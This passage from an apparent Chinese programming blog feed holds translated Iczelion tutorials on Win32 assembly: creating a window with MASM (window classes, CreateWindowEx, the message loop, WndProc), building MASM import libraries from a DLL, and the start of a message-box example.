<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WinMain proc Inst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</div></pre></td></tr></table></figure>
<p>上面是WinMain的定义。注意跟在 proc 指令后的parameter：type形式的参数，它们是由调用者传给 WinMain 的，我们引用是直接用参数名即可。至于压栈和退栈时的平衡堆栈工作由 MASM 在编译时加入相关的前序和后序汇编指令来进行。 <code>LOCAL wc：WNDCLASSEX LOCAL msg：MSG LOCAL hwnd：HWND LOCAL</code> 伪指令为局部变量在栈中分配内存空间，所有的 LOCAL 指令必须紧跟在 PROC 之后。LOCAL 后跟声明的变量，其形式是 变量名:变量类型。譬如 <code>LOCAL wc：WNDCLASSEX</code> 即是告诉 MASM 为名字叫 wc 的局部边量在栈中分配长度为 WNDCLASSEX 结构体长度的内存空间，然后我们在用该局部变量是无须考虑堆栈的问题，考虑到 DOS 下的汇编，这不能不说是一种恩赐。不过这就要求这样声明的局部变量在函数结束时释放栈空间，(也即不能在函数体外被引用)，另一个缺点是您因不能初始化您的局部变量，不得不在稍后另外再对其赋值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">mov wc.cbSize，SIZEOF WNDCLASSEX</div><div class="line">mov wc.style， CS_HREDRAW or CS_VREDRAW</div><div class="line">mov wc.lpfnWndProc， OFFSET WndProc</div><div class="line">mov wc.cbClsExtra，NULL</div><div class="line">mov wc.cbWndExtra，NULL</div><div class="line">push hInstance</div><div class="line">pop wc.hInstance</div><div class="line">mov wc.hbrBackground，COLOR_WINDOW+1 </div><div class="line">mov wc.lpszMenuName，NULL</div><div class="line">mov wc.lpszClassName，OFFSET ClassName </div><div class="line">invoke LoadIcon，NULL，IDI_APPLICATION</div><div class="line">mov wc.hIcon，eax</div><div class="line">mov wc.hIconSm，eax</div><div class="line">invoke LoadCursor，NULL，IDC_ARROW</div><div class="line">mov wc.hCursor，eax invoke </div><div class="line">RegisterClassEx， addr w</div></pre></td></tr></table></figure>
<p>上面几行从概念上说确实是非常地简单。只要几行指令就可以实现。其中的主要概念就是窗口类（window class），一个窗口类就是一个有关窗口的规范，这个规范定义了几个主要的窗口的元素，如：图标、光标、背景色、和负责处理该窗口的函数。您产生一个窗口时就必须要有这样的一个窗口类。如果您要产生不止一个同种类型的窗口时，最好的方法就是把这个窗口类存储起来，这种方法可以节约许多的内存空间。也许今天您不会太感觉到，可是想想以前 PC 大多数只有 1M 内存时，这么做是非常有必要的。如果您要定义自己的创建窗口类就必须：在一个 WINDCLASS 或 WINDOWCLASSEXE 结构体中指明您窗口的组成元素，然后调用 RegisterClass 或 RegisterClassEx ，再根据该窗口类产生窗口。对不同特色的窗口必须定义不同的窗口类。 WINDOWS有几个预定义的窗口类，譬如：按钮、编辑框等。要产生该种风格的窗口无须预先再定义窗口类了，只要包预定义类的类名作为参数调用 CreateWindowEx 即可。</p>
<p>WNDCLASSEX 中最重要的成员莫过于lpfnWndProc了。前缀 lpfn 表示该成员是一个指向函数的长指针。在 Win32中由于内存模式是 FLAT 型，所以没有 near 或 far 的区别。每一个窗口类必须有一个窗口过程，当 Windows 把属于特定窗口的消息发送给该窗口时，该窗口的窗口类负责处理所有的消息，如键盘消息或鼠标消息。由于窗口过程差不多智能地处理了所有的窗口消息循环，所以您只要在其中加入消息处理过程即可。下面我将要讲解 WNDCLASSEX 的每一个成员</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">WNDCLASSEX STRUCT DWORD </div><div class="line">  cbSize            DWORD      ? </div><div class="line">  style             DWORD      ? </div><div class="line">  lpfnWndProc       DWORD      ? </div><div class="line">  cbClsExtra        DWORD      ? </div><div class="line">  cbWndExtra        DWORD      ? </div><div class="line">  hInstance         DWORD      ? </div><div class="line">  hIcon             DWORD      ? </div><div class="line">  hCursor           DWORD      ? </div><div class="line">  hbrBackground     DWORD      ? </div><div class="line">  lpszMenuName      DWORD      ? </div><div class="line">  lpszClassName     DWORD      ? </div><div class="line">  hIconSm           DWORD      ? </div><div class="line">WNDCLASSEX ENDS</div></pre></td></tr></table></figure>
<ul>
<li><code>cbSize</code>：WNDCLASSEX 的大小。我们可以用sizeof（WNDCLASSEX）来获得准确的值。 </li>
<li><code>style</code>：从这个窗口类派生的窗口具有的风格。您可以用“or”操作符来把几个风格或到一起。 </li>
<li><code>lpfnWndProc</code>：窗口处理函数的指针。 </li>
<li><code>cbClsExtra</code>：指定紧跟在窗口类结构后的附加字节数。 </li>
<li><code>cbWndExtra</code>：指定紧跟在窗口事例后的附加字节数。如果一个应用程序在资源中用CLASS伪指令注册一个对话框类时，则必须把这个成员设成DLGWINDOWEXTRA。 </li>
<li><code>hInstance</code>：本模块的事例句柄。 </li>
<li><code>hIcon</code>：图标的句柄。 </li>
<li><code>hCursor</code>：光标的句柄。 </li>
<li><code>hbrBackground</code>：背景画刷的句柄。 </li>
<li><code>lpszMenuName</code>：指向菜单的指针。 </li>
<li><code>lpszClassName</code>：指向类名称的指针。 </li>
<li><code>hIconSm</code>：和窗口类关联的小图标。如果该值为NULL。则把hCursor中的图标转换成大小合适的小图标。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">invoke CreateWindowEx， NULL，\</div><div class="line">ADDR ClassName，\</div><div class="line">ADDR AppName，\</div><div class="line">WS_OVERLAPPEDWINDOW，\</div><div class="line">CW_USEDEFAULT，\</div><div class="line">CW_USEDEFAULT，\</div><div class="line">CW_USEDEFAULT，\</div><div class="line">CW_USEDEFAULT，\ </div><div class="line">NULL，\ </div><div class="line">NULL，\</div><div class="line">hInst，\</div><div class="line">NULL</div></pre></td></tr></table></figure>
<p>注册窗口类后，我们将调用<code>CreateWindowEx</code>来产生实际的窗口。请注意该函数有12个参数。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">CreateWindowExA proto dwExStyle：DWORD，\</div><div class="line">lpClassName：DWORD，\</div><div class="line">lpWindowName：DWORD，\ </div><div class="line">dwStyle：DWORD，\</div><div class="line">X：DWORD，\</div><div class="line">Y：DWORD，\</div><div class="line">nWidth：DWORD，\</div><div class="line">nHeight：DWORD，\</div><div class="line">hWndParent：DWORD ，\</div><div class="line">hMenu：DWORD，\ </div><div class="line">hInstance：DWORD，\</div><div class="line">lpParam：DWORD</div></pre></td></tr></table></figure>
<p>我们来仔细看一看这些的参数：</p>
<ul>
<li><code>dwExStyle</code>：附加的窗口风格。相对于旧的CreateWindow这是一个新的参数。在9X/NT中您可以使用新的窗口风格。您可以在Style中指定一般的窗口风格，但是一些特殊的窗口风格，如顶层窗口则必须在此参数中指定。如果您不想指定任何特别的风格，则把此参数设为NULL。 </li>
<li><code>lpClassName</code>：（必须）。ASCIIZ形式的窗口类名称的地址。可以是您自定义的类，也可以是预定义的类名。像上面所说，每一个应用程序必须有一个窗口类。 </li>
<li><code>lpWindowName</code>：ASCIIZ形式的窗口名称的地址。该名称会显示在标题条上。如果该参数空白，则标题条上什么都没有。 </li>
<li><code>dwStyle</code>：窗口的风格。在此您可以指定窗口的外观。可以指定该参数为零，但那样该窗口就没有系统菜单，也没有最大化和最小化按钮，也没有关闭按钮，那样您不得不按Alt+F4 来关闭它。最为普遍的窗口类风格是 <code>WS_OVERLAPPEDWINDOW</code>。 一种窗口风格是一种按位的掩码，这样您可以用<code>or</code>把您希望的窗口风格或起来。像 <code>WS_OVERLAPPEDWINDOW</code> 就是由几种最为普遍的风格<code>or</code>起来的。 </li>
<li><code>X</code>，<code>Y</code>： 指定窗口左上角的以像素为单位的屏幕坐标位置。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的位置。 </li>
<li><code>nWidth</code>，<code>nHeight</code>： 以像素为单位的窗口大小。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的大小。 </li>
<li><code>hWndParent</code>： 父窗口的句柄（如果有的话）。这个参数告诉 Windows 这是一个子窗口和他的父窗口是谁。这和 MDI（多文档结构）不同，此处的子窗口并不会局限在父窗口的客户区内。他只是用来告诉 Windows 各个窗口之间的父子关系，以便在父窗口销毁是一同把其子窗口销毁。在我们的例子程序中因为只有一个窗口，故把该参数设为 NULL。 </li>
<li><code>hMenu</code>： WINDOWS菜单的句柄。如果只用系统菜单则指定该参数为NULL。回头看一看<code>WNDCLASSEX</code> 结构中的 <code>lpszMenuName</code> 参数，它也指定一个菜单，这是一个缺省菜单，任何从该窗口类派生的窗口若想用其他的菜单需在该参数中重新指定。其实该参数有双重意义：一方面若这是一个自定义窗口时该参数代表菜单句柄，另一方面，若这是一个预定义窗口时，该参数代表是该窗口的 ID 号。Windows 是根据<code>lpClassName</code> 参数来区分是自定义窗口还是预定义窗口的。 </li>
<li><code>hInstance</code>： 产生该窗口的应用程序的实例句柄。 </li>
<li><code>lpParam</code>： （可选）指向欲传给窗口的结构体数据类型参数的指针。如在MDI中在产生窗口时传递 CLIENTCREATESTRUCT 结构的参数。一般情况下，该值总为零，这表示没有参数传递给窗口。可以通过GetWindowLong 函数检索该值。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov hwnd，eax</div><div class="line">invoke ShowWindow， hwnd，CmdShow</div><div class="line">invoke UpdateWindow， hwnd</div></pre></td></tr></table></figure>
<p>调用<code>CreateWindowEx</code>成功后，窗口句柄在eax中。我们必须保存该值以备后用。我们刚刚产生的窗口不会自动显示，所以必须调用 <code>ShowWindow</code> 来按照我们希望的方式来显示该窗口。接下来调用 <code>UpdateWindow</code> 来更新客户区。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.WHILE TRUE</div><div class="line">invoke GetMessage， ADDR msg，NULL，0，0</div><div class="line">.BREAK .IF (!eax)</div><div class="line">invoke TranslateMessage， ADDR msg </div><div class="line">invoke DispatchMessage， ADDR msg</div><div class="line">.ENDW</div></pre></td></tr></table></figure>
<p>这时候我们的窗口已显示在屏幕上了。但是它还不能从外界接收消息。所以我们必须给它提供相关的消息。我们是通过一个<strong>消息循环</strong>来完成该项工作的。每一个模块仅有一个消息循环，我们不断地调用 <code>GetMessage</code> 从 Windows 中获得消息。<code>GetMessage</code> 传递一个 MSG 结构体给 Windows ，然后 Windows 在该函数中填充有关的消息，一直到 Windows 找到并填充好消息后 <code>GetMessage</code> 才会返回。在这段时间内系统控制权可能会转移给其他的应用程序。这样就构成了Windows 下的多任务结构。如果 <code>GetMessage</code> 接收到 <code>WM_QUIT</code> 消息后就会返回 <code>FALSE</code>，使循环结束并退出应用程序。<code>TranslateMessage</code> 函数是一个是实用函数，它从键盘接受原始按键消息，然后解释成 <code>WM_CHAR</code>，再把 <code>WM_CHAR</code> 放入消息队列，由于经过解释后的消息中含有按键的 ASCII 码，这比原始的扫描码好理解得多。<strong>如果您的应用程序不处理按键消息的话，可以不调用该函数。</strong><code>DispatchMessage</code> 会把消息发送给负责该窗口过程的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov eax，msg.wParam</div><div class="line">ret</div><div class="line">WinMain endp</div></pre></td></tr></table></figure>
<p>如果消息循环结束了，退出码存放在 MSG 中的 wParam中，您可以通过把它放到 eax 寄存器中传给 Windows，目前 Windows 没有利用到这个结束码，但我们最好还是遵从 Windows 规范已防意外。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WndProc proc hWnd：HWND， uMsg：UINT， wParam：WPARAM， lParam：LPARAM</div></pre></td></tr></table></figure>
<p>是我们的窗口处理函数。您可以随便给该函数命名。其中第一个参数 hWnd 是接收消息的窗口的句柄。uMsg 是接收的消息。注意 uMsg 不是一个 MSG 结构，其实上只是一个 DWORD 类型数。Windows 定义了成百上千个消息，大多数您的应用程序不会处理到。当有该窗口的消息发生时，Windows 会发送一个相关消息给该窗口。其窗口过程处理函数会智能的处理这些消息。wParam 和 lParam 只是附加参数，以方便传递更多的和该消息有关的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.IF uMsg==WM_DESTROY</div><div class="line">invoke PostQuitMessage，NULL</div><div class="line">.ELSE </div><div class="line">invoke DefWindowProc，hWnd，uMsg，wParam，lParam</div><div class="line">ret</div><div class="line">.ENDIF</div><div class="line">xor eax，eax </div><div class="line">ret</div><div class="line">WndProc endp</div></pre></td></tr></table></figure>
<p><strong>上面可以说是关键部分。这也是我们写 Windows 程序时需要改写的主要部分。</strong>此处您的程序检查 Windows 传递过来的消息，如果是我们感兴趣的消息则加以处理，处理完后，在 eax 寄存器中传递 0，否则必须调用 <code>DefWindowProc</code>，把该窗口过程接收到的参数传递给缺省的窗口处理函数。所有消息中您<strong>必须处理的是 <code>WM_DESTROY</code></strong>，当您的应用程序结束时 Windows 把这个消息传递进来，当您的应用程序接收到该消息时它已经在屏幕上消失了，这仅是通知您的应用程序窗口已销毁，您必须自己准备返回 Windows 。在此消息中您可以做一些清理工作，但无法阻止退出应用程序。如果您要在窗口销毁前做一些额外工作，可以处理 <code>WM_CLOSE</code> 消息。在处理完清理工作后，您必须调用 <code>PostQuitMessage</code>，该函数会把 <code>WM_QUIT</code> 消息传回您的应用程序，而该消息会使得 GetMessage 返回，并在 eax 寄存器中放入 0，然后会结束消息循环并退回 WINDOWS。您可以在您的程序中调用 <code>DestroyWindow</code> 函数，它会发送一个 WM_DESTROY 消息给您自己的应用程序，从而迫使它退出。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>怎样建立你自己的MASM导入库</title>
    <link href="http://hacktech.cn/2018/02/06/%E6%80%8E%E6%A0%B7%E5%BB%BA%E7%AB%8B%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84MASM%E5%AF%BC%E5%85%A5%E5%BA%93.html"/>
    <id>http://hacktech.cn/2018/02/06/怎样建立你自己的MASM导入库.html</id>
    <published>2018-02-06T12:00:49.000Z</published>
    <updated>2018-04-10T13:23:40.150Z</updated>
    
    <content type="html"><![CDATA[<p>by Iczelion （翻译：花心萝卜yqzq@163.net) 9.5.2000</p>
<p>这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。</p>
<a id="more"></a>
<hr>
<h2 id="MASM导入库的格式："><a href="#MASM导入库的格式：" class="headerlink" title="MASM导入库的格式："></a>MASM导入库的格式：</h2><hr>
<p>MASM和VC++可以使用相同的导入库，MS导入库使用不同于TASM的OMF格式的变更的COFF文件格式，这就是为什么TASM和MASM的导入库不能互用的原因，我将不详细介绍有关MS导入库的格式。可以这样说，每一个MS导入库都包含某个DLL中函数的信息（你将要用这些信息来调用DLL中的函数），这些信息包括函数名和它所有参数的尺寸。如果你用一个文本编辑器打开kernel32.lib，你回发现一些如下格式的信息：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">_ExitProcess@4 </div><div class="line">_CreateProcessA@40</div></pre></td></tr></table></figure>
<p>函数名被装饰上了一个“_”，在“@”之后的数字表示了该函数所有参数的尺寸（字节为单位），ExitProcess 函数只有一个DWORD的参数，所以后面的数字是4。 LIB中为什么要包含这些参数尺寸的信息呢？当你用INVOKE调用函数时，这些信息被用来检测传递给函数的参数是否正确。如果你使用“手工”将参数压入堆栈，并通过“CALL”来调用函数的话，MASM将无法检测参数是否正确。这将导致我们几乎没有办法建立一个DLL的导入库，因为DLL并不包含清楚的关于参数尺寸的信息。</p>
<hr>
<h2 id="从DLL建立MASM导入库"><a href="#从DLL建立MASM导入库" class="headerlink" title="从DLL建立MASM导入库"></a>从DLL建立MASM导入库</h2><hr>
<p>如果你很乐意用“手动”（CALL）的方法去调用函数的话，你可以象下面这样为任何一个DLL建立MASM的导入库：<br>使用dumpbin.exe,它可以导出DLL 输出（EXPORT）函数的名字。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Dumpbin /EXPORTS  blah.dll  &gt;  output.txt</div></pre></td></tr></table></figure></p>
<p>在你获得了函数名列表之后，通过他们建立一个模块定义文件（.DEF）。 举个例子：如果DLL只包含一个函数：GetSomeLine 在一个文本文件中输入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LIBRARY blah </div><div class="line">EXPORTS </div><div class="line">GetSomeLine</div></pre></td></tr></table></figure>
<p>并将其保存为“blah.def<br>象这样，运行lib.exe，通过模块定义文件建立一个导入库：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lib /DEF:blah.def</div></pre></td></tr></table></figure>
<p>就是它了！你将获得blah.lib,只要你不使用INVOKE调用函数的话，你就可以在MASM中使用它。</p>
<hr>
<h2 id="建立通过INVOKE调用函数的MASM导入库"><a href="#建立通过INVOKE调用函数的MASM导入库" class="headerlink" title="建立通过INVOKE调用函数的MASM导入库:"></a>建立通过INVOKE调用函数的MASM导入库:</h2><hr>
<p>我并不反对你使用上面的方法，但INVOKE确实是一个调用函数的好途径。这也是我较TASM更喜欢MASM的原因之一。但就象我早先强调的，我们几乎不可能从一个DLL建立一个能100%工作的MASM导入库。如果你使用INVOKE，你将不能用上面的方法建立一个MASM导入库。举个例子，你可以想象如果你在.DEF文件中修改了函数的“@XX”部分，导入库将仍然正常建立，但请相信我，他不会工作的。 建立一个可以使用INVOKE的导入库的一个简单的方法是使用MASM。如果你写过DLL的代码，你会发现你不仅的到了一个DLL，而且还得到了一个导入库，没错，它就是我们要得！ 我们的策略是： </p>
<ol>
<li>获得函数名和所有参数的尺寸</li>
<li>建立一个包含正确个数和尺寸的DLL源代码 </li>
<li>建立一个描述ASM源代码中相应函数的模块定义文件（.DEF） </li>
<li>将源代码按DLL汇编 </li>
</ol>
<p>你将获得一个功能完全的MASM导入库，上面的步骤应做更多的说明 </p>
<hr>
<h2 id="获得函数名和所有参数尺寸"><a href="#获得函数名和所有参数尺寸" class="headerlink" title="获得函数名和所有参数尺寸"></a>获得函数名和所有参数尺寸</h2><hr>
<p>这是我们处理过程中最困难的部分了。如果你仅仅只有DLL，你将经历无意义的冒险。下面是我所能想出的方法，不过没有一个能100%工作。  </p>
<p>使用交互式反编译工具（Interactive Disassembler (IDA)）反编译DLL，通过这个奇妙的工具，你可以获得函数参数的大概尺寸，但这些信息是不完全的，IDA是一个功能强大的工具，不过有时必须靠我们自己判断什么是什么。你将不得不仔细分析反编译后的结果。  </p>
<p>观察堆栈指针在调用函数之前和之后的值。方法如下：  </p>
<ol>
<li>通过GetProcAddress获得函数的地址。</li>
<li>调用想要测试的每一个函数，但请注意，调用这些函数时，不要给他们传递任何的参数。调用前请注意ESP的值。</li>
<li>当函数返回后，比较调用函数前、后ESP的值。基本原理是：stdcall参数调用协定规定，函数自己负责恢复堆栈，现在知道为什么我们要不传递任何参数了吧，我们没传递参数，而函数却自作聪明“恢复”了ESP指针，所以ESP的变化值就是我们要得参数尺寸了。</li>
</ol>
<p>不过，上面的方法并不是万无一失的，下面的这些情况将会导致失败：</p>
<ul>
<li>如果DLL中的函数使用了不同于stdcall的别的参数传递协定。</li>
<li>如果函数在恢复堆栈时失败，我们将无法得到ESP的正确值。</li>
<li>如果这个函数的作用是去做一些危险的事情，比如硬盘格式化，那我们即使得到了ESP，恐怕代价大了点</li>
</ul>
<p>研究现有的使用DLL的程序，你可以通过调试/反编译这些程序去获得函数参数的个数和尺寸。不论如何，只要有函数在DLL中，而又没有任何程序调用过它，你可以用上面的两个方法。 </p>
<hr>
<h2 id="建立我们自己的DLL"><a href="#建立我们自己的DLL" class="headerlink" title="建立我们自己的DLL"></a>建立我们自己的DLL</h2><hr>
<p>在你获得了函数的名字和参数尺寸后，你可以建立一个DLL框架并在框架中添加和其他DLL、文件中的相同名称的函数。举个例子，如果DLL只含有一个函数：GetSomeLine.它有16BYTES的参数。在ASM文件中，你可以这样写： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.386 </div><div class="line">.model flat,stdcall </div><div class="line">.code </div><div class="line">GetSomeLine proc param1:DWORD, param2:DWORD, param3:DWORD, param4:DWORD </div><div class="line">GetSomeline endp </div><div class="line">end</div></pre></td></tr></table></figure>
<p>你可能要问，“这是什么？”。一个没有处理部分的程序？请记住：一个导入库并没有记录一个函数是如何实现的，它只是记录函数名和参数尺寸而已，它的任务就是提供函数的名称和尺寸。所以我们不需要添加函数的处理部分。当我们建立DLL时，MASM会帮我们完成它的导入库的建立。 MASM在建立导入库时并不关心每个具体参数的尺寸，它总是象下面这样：<br>　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.386 </div><div class="line">.model flat,stdcall </div><div class="line">.code </div><div class="line">GetSomeLine proc param1:BYTE, param2:BYTE, param3:BYTE, param4:BYTE </div><div class="line">GetSomeline endp </div><div class="line">end</div></pre></td></tr></table></figure></p>
<p>然后MASM将在导入库中建立_GetSomeLine@16(它会把每一个参数看作DWORD)，而并不管它的参数是4个BYTE还是DWORD或是其他什么</p>
<hr>
<h2 id="建立匹配的模块定义文件（-DEF）"><a href="#建立匹配的模块定义文件（-DEF）" class="headerlink" title="建立匹配的模块定义文件（.DEF）"></a>建立匹配的模块定义文件（.DEF）</h2><hr>
<p>这是一个简单的工作，你需要这个文件来指导MASM去建立正确的DLL和与之匹配的导入库。一个模块定义文件模板如下： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LIBRARY  &lt;The name of the DLL&gt; </div><div class="line">EXPORTS </div><div class="line">&lt;The names of the functions&gt;</div></pre></td></tr></table></figure>
<p>你仅仅需要填入DLL的名字，然后在EXPORTS下添入函数的名字。每个函数名一行。保存文件，你将获得一个模块定义文件。 </p>
<hr>
<h2 id="汇编DLL源代码"><a href="#汇编DLL源代码" class="headerlink" title="汇编DLL源代码"></a>汇编DLL源代码</h2><hr>
<p>最后一步也是最简单的一步，仅仅需要ML.EXE和LINK.EXE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ml /c /coff /Cp blah.asm </div><div class="line">link /DLL /NOENTRY /def:blah.def /subsystem:windows blah.obj</div></pre></td></tr></table></figure></p>
<p>好了，查看一下你的项目目录，你会发现你想要的导入库和DLL。</p>
<p><strong>转自<a href="http://blog.csdn.net/taowen2002/article/details/15837" target="_blank" rel="external">http://blog.csdn.net/taowen2002/article/details/15837</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;by Iczelion （翻译：花心萝卜yqzq@163.net) 9.5.2000&lt;/p&gt;
&lt;p&gt;这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。&lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>win32 汇编学习(2)：消息框</title>
    <link href="http://hacktech.cn/2018/02/05/win32-%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2-%EF%BC%9A%E6%B6%88%E6%81%AF%E6%A1%86.html"/>
    <id>http://hacktech.cn/2018/02/05/win32-汇编学习-2-：消息框.html</id>
    <published>2018-02-05T09:04:32.000Z</published>
    <updated>2018-04-10T13:21:35.438Z</updated>
    
    <content type="html"><![CDATA[<p>这一次，我们将用汇编语言写一个 Windows 程序，程序运行时将弹出一个消息框并显示”你好，我的第一个Win32汇编程序”。</p>
<a id="more"></a>
<h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><p>Windows 为编写应用程序提供了大量的资源。其中最重要的是Windows API (Application Programming Interface)。 Windows API是一大组功能强大的函数，它们本身驻扎在 Windows 中供人们随时调用。这些函数的大部分被包含在几个动态链接库(DLL)中，譬如：kernel32.dll、 user32.dll 和 gdi32.dll。 Kernel32.dll中的函数主要处理内存管理和进程调度；user32.dll中的函数主要控制用户界面；gdi32.dll中的函数则负责图形方面的操作。除了上面主要的三个动态链接库，您还可以调用包含在其他动态链接库中的函数，当然您必须要有关于这些函数的足够的资料。  </p>
<p>动态链接库，顾名思义，这些 API 的代码本身并不包含在 Windows 可执行文件中，而是当要使用时才被加载。为了让应用程序在运行时能找到这些函数，就必须事先把有关的重定位信息嵌入到应用程序的可执行文件中。这些信息存在于引入库中，由链接器把相关信息从引入库中找出插入到可执行文件中。您必须指定正确的引入库，因为只有正确的引入库才会有正确的重定位信息。  </p>
<p>当应用程序被加载时 Windows 会检查这些信息，这些信息包括动态链接库的名字和其中被调用的函数的名字。若检查到这样的信息，Windows 就会加载相应的动态链接库，并且重定位调用的函数语句的入口地址，以便在调用函数时控制权能转移到函数内部。  </p>
<p>如果从和字符集的相关性来分，API 共有两类：一类是处理 ANSI 字符集的，另一类是处理 UNICODE 字符集的。前一类函数名字的尾部带一个”A”字符，处理UNICODE的则带一个”W”字符(宽字符)。我们比较熟悉的ANSI字符串是以 0 (NULL) 结尾的一串字符数组，每一个ANSI字符是一个 BYTE 宽。对于欧洲语言体系，ANSI 字符集已足够了，但对于有成千上万个唯一字符的几种象形语言体系来说就只有用 UNICODE 字符集了。每一个 UNICODE 字符占有两个 BYTE 宽，这样一来就可以在一个字符串中使用 65336 个不同字符了。  </p>
<p>这也是为什么引进 UNICODE 的原因。在大多数情况下我们都可以包含一个头文件，在其中定义一个宏，然后在实际调用函数时，函数名后不需要加后缀”A”或”W”。<br>如在头文件中定义函数<code>foo()</code>；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICODE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> foo() fooW()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> foo() fooA()</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我先把程序框架放在下面，然后我们再向里面加东西。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat， stdcall</div><div class="line">.data</div><div class="line">.code</div><div class="line">start：</div><div class="line">end start</div></pre></td></tr></table></figure>
<p>应用程序的执行是从 END 定义的标识符后的第一条语句开始的。在上面的框架程序中就是从 START 开始。程序逐条语句执行一直到遇到 JMP，JNE，JE，RET 等跳转指令。这些跳转指令将把执行权转移到其他语句上，若程序要退出 Windows，则必须调用函数 ExitProcess。</p>
